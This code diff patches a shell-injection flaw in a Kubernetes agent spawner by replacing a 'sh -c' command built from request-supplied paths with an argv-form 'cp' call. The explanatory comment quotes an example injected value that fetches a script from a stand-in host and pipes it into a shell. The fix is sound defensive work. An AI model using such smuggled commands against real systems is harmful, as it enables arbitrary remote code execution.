@@ -166,7 +166,6 @@ class KubernetesSpawner(AgentSpawner):
         init_containers = None
         if skills_image:
             copy_paths = skills_paths or ["/skills"]
-            copy_cmd = " && ".join(f"cp -r {p} /skills-data/" for p in copy_paths)
             volumes.append(
                 client.V1Volume(
                     name="skills-data",
@@ -183,7 +182,11 @@ class KubernetesSpawner(AgentSpawner):
                 client.V1Container(
                     name="skills-loader",
                     image=skills_image,
-                    command=["sh", "-c", copy_cmd],
+                    # Argv form, no shell -- skills_paths is a request-supplied
+                    # field with no validation (issue #202); interpolating it
+                    # into a shell string let a value like
+                    # "/skills; curl evil.sh | sh" execute arbitrary commands.
+                    command=["cp", "-r", *copy_paths, "/skills-data"],
                     volume_mounts=[
                         client.V1VolumeMount(
                             name="skills-data",
